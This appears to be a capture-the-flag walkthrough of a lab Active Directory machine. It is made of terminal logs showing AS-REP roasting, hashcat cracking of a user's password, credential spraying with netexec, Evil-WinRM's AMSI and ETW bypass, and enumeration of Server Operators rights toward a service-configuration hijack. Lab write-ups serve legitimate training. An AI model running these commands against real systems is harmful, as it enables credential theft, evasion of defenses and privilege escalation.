use the GetNPUers.py

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# locate GetNPUsers.py
/home/kali/.cache/uv/archive-v0/YT8sqWT3bWxNQNAsKLlIE/impacket-0.14.0.dev0+20260226.31512.9d3d86ea.data/scripts/GetNPUsers.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/build/scripts-3.13/GetNPUsers.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/examples/GetNPUsers.py
/opt/py_env/bin/GetNPUsers.py
/root/.cache/uv/archive-v0/Ps3A_H_DHWFH-YB5Uitii/impacket-0.13.0.data/scripts/GetNPUsers.py
/root/.cache/uv/environments-v2/pygpoabuse-31dbfe2752820717/bin/GetNPUsers.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/build/scripts-3.13/GetNPUsers.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/examples/GetNPUsers.py
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
                                                           
```

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# /usr/share/doc/python3-impacket/examples/GetNPUsers.py  MEGACORP.LOCAL/JORDEN -request -no-pass -dc-ip 10.129.95.200

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for JORDEN
[-] User JORDEN doesn't have UF_DONT_REQUIRE_PREAUTH set

```

Using the Microsoft 's default ActiveDiretory to search the Jorden 's infomation

```
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden


DistinguishedName : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
Enabled           : True
GivenName         : Jorden
Name              : Jorden Mclean
ObjectClass       : user
ObjectGUID        : 0fa62545-eff1-4805-b16f-a18cf4217418
SamAccountName    : jorden
SID               : S-1-5-21-3167813660-1240564177-918740779-3110
Surname           : Mclean
UserPrincipalName : jorden@MEGACORP.LOCAL


```

```
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden | Set-ADAccountControl -DoesNotRequirePreAuth $true
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden


DistinguishedName : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
Enabled           : True
GivenName         : Jorden
Name              : Jorden Mclean
ObjectClass       : user
ObjectGUID        : 0fa62545-eff1-4805-b16f-a18cf4217418
SamAccountName    : jorden
SID               : S-1-5-21-3167813660-1240564177-918740779-3110
Surname           : Mclean
UserPrincipalName : jorden@MEGACORP.LOCAL


```

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# /usr/share/doc/python3-impacket/examples/GetNPUsers.py  MEGACORP.LOCAL/JORDEN -request -no-pass -dc-ip 10.129.95.200

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for JORDEN
$krb5asrep$23$JORDEN@MEGACORP.LOCAL:4b271c4d30fa1e8fdd598decb51490a5$3e8374516a4068ecc353af4a457bfb06700c3f64960d370e9ab41474c4441f0a083c0b5c80bb28bccc3adf1fef68212ac83af1fb74d5994afc768d45bb79a619e7e899daaccb3519209ffe3d78ba3c0196083ebcf178fd97ab15925c853f283031dea806932f93b3e8641b3ad80f75b8bc07b57d60565eda4e2a708d19bebaccb7d9627e7dfaa907f0c71d9f1199fe4022ab6d68fa6b515eceb82da09ea2ac392c6f22b6d3b6121d6107caf334d6aab60dfd134175a38be6f1e196f2b825adcdb87a2ac15a1814fb9eed445c53166cf257937d55b481e167cd1841b3711837356e863df7eafb68da72f87dac1bf4bc4b

```

Now is ok

```
┌──(root㉿kali)-[~/Desktop]
└─# cat jorden.hash 
$krb5tgs$23$*jorden$MEGACORP.LOCAL$MEGACORP.LOCAL/jorden*$5cf7a917baa333bbfed969dfbfe01aec$dd5d8251d01f4ff48bd63235757a14e3787e787c840373f0fe3b77ec6bfafae9e226c7c438dc70b48affc9d604abbb0c01543a2f09ef69f8921b5ecb47efc57dd77fed62e069a82b34f4c74b0d94656a8953134f05083875843f5007a6a585312075cb1b9addc81a1571f1ca30ffa1709a3d6eb9fe0e7d2cba9b80f77d983bc17ac486206f9f52a2605fe51f637166f631c3f08e6b9d4fa9b201b0a8f58cbb1959f44186a8a652bec77e513b53ec87102762c0a0afacc9335c7f97991bb6e4207315f6187a589cb54a2623a4bfe255ab1bbf0cf69a9987f7d52debefa4e4b8dee3f2e059684c8fe08876fde18ae2ae217d464b38577799154558da4ed17e89e44d286713136a304421620cf91ad5a795bbb1e994c8f6d9d612e6a138b6e907d10228ec1b9a54056052c4ef3066445825a6887de1ecacc88d524adf3552aef5b254b2d538bcfe0bb040d0df2b2caebf02085cfa2c0df9b96119ad964faadbc05a262ad5f8ccc35ec29e410373389ffc7cb6ef9294c849037b91ab237fc0f1d789c593c8b81737fc0a679a57c590515badbb89815df8e753b96ced6a90767aa41044a61719fc677eb2f7e5bbf565237ecbe922896144b972f70c5f3f07fe7782aeb84177325190242741d57b34cf98d3e2b1589ec17298f6adcb7c55d883f1309816f364e98b037484460cb2b6d820d7a106bc0315f594d9cb62470ddef416cd20e52d4ae57b694c0b9b60cafe13bea15a9f2de3c1f17470bb10ac7ed0b9235be05c02db59668aa7c7afc7e5ca2a8899885c68488fe6b41df9d3b16eaa1093964ef5a89cfa9ed7e198f68333ec5bfb7e8a783645b40735825f3c736e13f0a4a29f6e93e3fe8646af534746c523c3a3a6ee8250c765dcbc46e599ee2e11c49cf8b0c75f6a719665817d3c2dd5ce11040426f74e2e0240bcbf05b3c3ecf871729b9783f12a9b279b069e7d0dab0a33732b7530db6199a32be85b4b1e5cd7cd7e7a34610eda3a5b0967c3c6434d408babcd2b3729d4a23c2fd4ead6be58c9205dadc95ab1070f9617af98eeceabe02ea4898a9d937821c5d9ae7b22bd54042c782bc5d6e2fbd60dbd2f0554720a7be5ecdcf6f75a581aeabf8b072816be13aa88c5ad7b6a32203b8d25f363fe7aef9b5af969670fff2254682792bddff0dbae9b09f1e03dbe5d4028de556b5a7373c9c321afb849575d5518225602b6a3804809f6b80f46bc2645fd5c3f17365a674d02865b38ddf7832743a1a07a90e486845311de89990cae74850b3d8b38ae0e5b95c0519dabc2d235346a345a00750329774c7f1899d190345a2cf63970515032043237487acbb85cb9d52e331eea26c76ac6420570e2071764e8a61b8a40c19d

```

```
┌──(root㉿kali)-[~/Desktop]
└─# hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) Ultra 7 255U, 6971/13942 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (10520 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$JORDEN@MEGACORP.LOCAL:4b271c4d30fa1e8fdd598decb51490a5$3e8374516a4068ecc353af4a457bfb06700c3f64960d370e9ab41474c4441f0a083c0b5c80bb28bccc3adf1fef68212ac83af1fb74d5994afc768d45bb79a619e7e899daaccb3519209ffe3d78ba3c0196083ebcf178fd97ab15925c853f283031dea806932f93b3e8641b3ad80f75b8bc07b57d60565eda4e2a708d19bebaccb7d9627e7dfaa907f0c71d9f1199fe4022ab6d68fa6b515eceb82da09ea2ac392c6f22b6d3b6121d6107caf334d6aab60dfd134175a38be6f1e196f2b825adcdb87a2ac15a1814fb9eed445c53166cf257937d55b481e167cd1841b3711837356e863df7eafb68da72f87dac1bf4bc4b:rainforest786
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$JORDEN@MEGACORP.LOCAL:4b271c4d30fa1e8...f4bc4b
Time.Started.....: Fri May 15 02:26:48 2026, (3 secs)
Time.Estimated...: Fri May 15 02:26:51 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1479.5 kH/s (2.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4407296/14344385 (30.72%)
Rejected.........: 0/4407296 (0.00%)
Restore.Point....: 4399104/14344385 (30.67%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: rajalroo -> rageagaisntmachine
Hardware.Mon.#01.: Util: 51%

Started: Fri May 15 02:26:46 2026
Stopped: Fri May 15 02:26:52 2026

```

```
┌──(root㉿kali)-[~/Desktop]
└─#  for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto 10.129.95.200  -u 'jorden' -p 'rainforest786'; done


[*] Testing smb...
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                                        
SMB         10.129.95.200   445    MULTIMASTER      [+] MEGACORP.LOCAL\jorden:rainforest786 

[*] Testing winrm...
WINRM       10.129.95.200   5985   MULTIMASTER      [*] Windows 10 / Server 2016 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.200   5985   MULTIMASTER      [+] MEGACORP.LOCAL\jorden:rainforest786 (Pwn3d!)

[*] Testing wmi...
RPC         10.129.95.200   135    MULTIMASTER      [*] Windows 10 / Server 2016 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
RPC         10.129.95.200   135    MULTIMASTER      [+] MEGACORP.LOCAL\jorden:rainforest786 

[*] Testing rdp...
[-] Schema mismatch detected for table 'hosts' in protocol 'RDP'
[-] This is probably because a newer version of nxc is being run on an old DB schema.
[-] Optionally save the old DB data (`cp /root/.nxc/workspaces/default/rdp.db ~/nxc_rdp.bak`)
[-] Then remove the RDP DB (`rm -f /root/.nxc/workspaces/default/rdp.db`) and run nxc to initialize the new DB

[*] Testing ssh...


```

### Turn the firewall

{{< toggle "Tag 🏷️" >}}

{{< tag "Port5985-winrm-evil-winrm-AMSI-firewall-bypass" >}} Evil-WinRM has an AMSI bypass built in. It’s a bit weird in that you have to run `menu` first, and then the command, or it errors out:

{{< /toggle >}}

```
*Evil-WinRM* PS C:\ProgramData> Bypass-4MSI        
The term 'Bypass-4MSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Bypass-4MSI
+ ~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Bypass-4MSI:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\ProgramData> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] clear
[+] cls
[+] menu
[+] exit

*Evil-WinRM* PS C:\ProgramData> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
                                        
Info: Patching ETW, please be patient ..
                                        
[+] Success!

```

### Enumeration

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Enumation-net-user" >}} Using the windows command of net user to query and discover the Local Group Memberships is Server Operators , so that group is easily to be attacked by changing the service , in here is to changing the web service with winpeas to know that The key clue is hidden in the Scheduled Tasks section of the output. Look at  Revert2:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# evil-winrm -u "MEGACORP\jorden" -p rainforest786 -i 10.129.95.200
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

```

```
*Evil-WinRM* PS C:\Users\jorden\Documents> net user jorden
User name                    jorden
Full Name                    Jorden Mclean
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:48:17 PM
Password expires             Never
Password changeable          1/10/2020 5:48:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/14/2026 11:12:38 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Server Operators
Global Group memberships     *Domain Users         *Developers
The command completed successfully.


```

[Reading about it](http://www.thenetworkencyclopedia.com/entry/server-operators-built-in-group/), by default, this group can:

> * Log on locally to the server console
> * Change the system time
> * Back up files and directories
> * Restore files and directories
> * Shut down the system
> * Force shutdown from a remote system

From [ss64.com](https://ss64.com/nt/syntax-security_groups.html):

> A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.

https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

the Server Operators is easily to be attack as the full admin powershell

```
*Evil-WinRM* PS C:\Users\jorden\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                           True aspnet_state     
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5EB04B3D-85AE-4574-88FB-F22CF32D39F5}\MpKslDrv.sys       True MpKslDrv         
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER                          True MSSQLSERVER      
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"                                                     True SQLBrowser       
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER                         True SQLSERVERAGENT   
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service                                True SQLTELEMETRY     
"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"                                                            True SQLWriter        
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\NisSrv.exe"                                              True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\MsMpEng.exe"                                             True WinDefend        


```

If a user has `SERVICE_CHANGE_CONFIG` permission on a service (even without admin rights), they can redirect what binary the service runs.

https://github.com/hansalemaos/accesschk2df

```
┌──(root㉿kali)-[~/Desktop]
└─# wget https://github.com/hansalemaos/accesschk2df/blob/main/accesschk.exe 
--2026-05-15 03:02:16--  https://github.com/hansalemaos/accesschk2df/blob/main/accesschk.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘accesschk.exe’

accesschk.exe           [ <=>             ] 219.03K  --.-KB/s    in 0.1s    

2026-05-15 03:02:16 (1.66 MB/s) - ‘accesschk.exe’ saved [224282]

```

```
*Evil-WinRM* PS C:\ProgramData> upload accesschk.exe 
                                        
Info: Uploading /root/Desktop/accesschk.exe to C:\ProgramData\accesschk.exe
                                        
Data: 299040 bytes of 299040 bytes copied
                                        
Info: Upload successful!

```

```
*Evil-WinRM* PS C:\ProgramData> $env:PROCESSOR_ARCHITECTURE
AMD64
```

now work

```
*Evil-WinRM* PS C:\ProgramData> .\accesschk64a.exe
Program 'accesschk64a.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
+ .\accesschk64a.exe
+ ~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\accesschk64a.exe
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

### winpeas

```
*Evil-WinRM* PS C:\ProgramData> $env:PROCESSOR_ARCHITECTURE
AMD64
```

The key clue is hidden in the **Scheduled Tasks** section of the output. Look at `Revert2`:

```
(MEGACORP\administrator) Revert2: cmd.exe /c sc.exe config browser binpath= "C:\Windows\System32\svchost.exe -k smbsvcs" Trigger: At 4:31 PM on 1/9/2020-After triggered, repeat every 00:02:00
```

Two things confirm it as the target. First, Server Operators have registry write access (shown in the giant list): `HKLM\system\currentcontrolset\services\browser` has `Server Operators [Allow: WriteKey GenericWrite]`. Second, the revert task proves it was already exploited or anticipated as the attack path.

```
┌──(root㉿kali)-[~/Desktop]
└─# wget  https://github.com/peass-ng/PEASS-ng/releases/download/20260510-cd4bd619/linpeas_linux_amd64
--2026-05-15 03:07:44--  https://github.com/peass-ng/PEASS-ng/releases/download/20260510-cd4bd619/linpeas_linux_arm64
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/165548191/4f224a61-e041-4ce2-9b83-abb1f21202f1?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-15T08%3A06%3A30Z&rscd=attachment%3B+filename%3Dlinpeas_linux_arm64&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-15T07%3A06%3A14Z&ske=2026-05-15T08%3A06%3A30Z&sks=b&skv=2018-11-09&sig=tfHDWjxw83WWKfqK2ldoaV%2FvwCFEF4DtqOP6j8K%2FifY%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3ODgyOTE2MywibmJmIjoxNzc4ODI4ODYzLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.esPW66ky71XFTESVWg9d6BGZedEK9ocjxrw8JWU3xu4&response-content-disposition=attachment%3B%20filename%3Dlinpeas_linux_arm64&response-content-type=application%2Foctet-stream [following]
--2026-05-15 03:07:45--  https://release-assets.githubusercontent.com/github-production-release-asset/165548191/4f224a61-e041-4ce2-9b83-abb1f21202f1?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-15T08%3A06%3A30Z&rscd=attachment%3B+filename%3Dlinpeas_linux_arm64&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-15T07%3A06%3A14Z&ske=2026-05-15T08%3A06%3A30Z&sks=b&skv=2018-11-09&sig=tfHDWjxw83WWKfqK2ldoaV%2FvwCFEF4DtqOP6j8K%2FifY%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3ODgyOTE2MywibmJmIjoxNzc4ODI4ODYzLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.esPW66ky71XFTESVWg9d6BGZedEK9ocjxrw8JWU3xu4&response-content-disposition=attachment%3B%20filename%3Dlinpeas_linux_arm64&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4054809 (3.9M) [application/octet-stream]
Saving to: ‘linpeas_linux_arm64’

linpeas_linux_arm64 100%[================>]   3.87M  5.81MB/s    in 0.7s    

2026-05-15 03:07:46 (5.81 MB/s) - ‘linpeas_linux_arm64’ saved [4054809/4054809]


```

```
*Evil-WinRM* PS C:\ProgramData> .\winPEASany.exe
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help                                                                                 
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

               ((((((((((((((((((((((((((((((((                                                                                                             
        (((((((((((((((((((((((((((((((((((((((((((                                                                                                         
      ((((((((((((((**********/##########(((((((((((((                                                                                                      
    ((((((((((((********************/#######(((((((((((                                                                                                     
    ((((((((******************/@@@@@/****######((((((((((                                                                                                   
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                 
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                
    (((############*********/%@@@@@@@@@/************((((((((                                                                                                
    ((##################(/******/@@@@@/***************((((((                                                                                                
    ((#########################(/**********************(((((                                                                                                
    ((##############################(/*****************(((((                                                                                                
    ((###################################(/************(((((                                                                                                
    ((#######################################(*********(((((                                                                                                
    ((#######(,.***.,(###################(..***.*******(((((                                                                                                
    ((#######*(#####((##################((######/(*****(((((                                                                                                
    ((###################(/***********(##############()(((((                                                                                                
    (((#####################/*******(################)((((((                                                                                                
    ((((############################################)((((((                                                                                                 
    (((((##########################################)(((((((                                                                                                 
    ((((((########################################)(((((((                                                                                                  
    ((((((((####################################)((((((((                                                                                                   
    (((((((((#################################)(((((((((                                                                                                    
        ((((((((((##########################)(((((((((                                                                                                      
              ((((((((((((((((((((((((((((((((((((((                                                                                                        
                 ((((((((((((((((((((((((((((((                                                                                                             

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                      
                                                                                                                                                            
  WinPEAS-ng by @hacktricks_live                                                                                                                            

       /---------------------------------------------------------------------------------\                                                                  
       |                             Do you like PEASS?                                  |                                                                  
       |---------------------------------------------------------------------------------|                                                                  
       |         Linux PE & Hardening    :     https://hacktricks-training.com/courses/lhe/ |                                                               
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                  
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                  
       |---------------------------------------------------------------------------------|                                                                  
       |                                 Thank you!                                      |                                                                  
       \---------------------------------------------------------------------------------/                                                                  
                                                                                                                                                            
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
 Best Linux PE & Hardening course: https://hacktricks-training.com/courses/lhe/                                                                             
   Creating Dynamic lists, this could take a while, please wait...                                                                                          
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                              
   at System.Management.ManagementScope.Initialize()                                                                                                        
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                               
   at System.Management.ManagementObjectSearcher.Get()                                                                                                      
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                 
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...

                                                                                                                                                            
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information (T1082,T1068,T1548.002,T1003.001,T1003.004,T1003.005,T1059.001,T1552.001,T1552.002,T1562.001,T1562.002,T1518.001,T1557.001,T1558,T1559,T1134.001,T1547.005,T1484.001,T1613,T1654,T1072,T1187) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                            
                                                                                                                                                            
ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information (T1082)                                                                                                               
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                                                                                                                                    
  [X] Exception: Access is denied                                                                                                                           
                                                                                                                                                            
ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Version Vulnerabilities (T1082,T1068)                                                                                                  
  [X] Exception: Access is denied                                                                                                                           
                                                                                                                                                            
ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates (T1082)                                                                                                          
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).                                                                
                                                                                                                                                            
ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)                                                                                                 
 (T1082)                                                                                                                                                    
    Last Shutdown Date/time        :    8/19/2021 7:11:38 AM                                                                                                
                                                                                                                                                            
ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables (T1082)                                                                                                             
È Check for some passwords or keys in the env variables                                                                                                     
    COMPUTERNAME: MULTIMASTER                                                                                                                               
    PUBLIC: C:\Users\Public                                                                                                                                 
    LOCALAPPDATA: C:\Users\jorden\AppData\Local                                                                                                             
    PSModulePath: C:\Users\jorden\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Microsoft SQL Server\140\DTS\Binn\;C:\Program Files\Microsoft SQL Server\140\DTS\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft\Web Platform Installer\;C:\Users\jorden\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
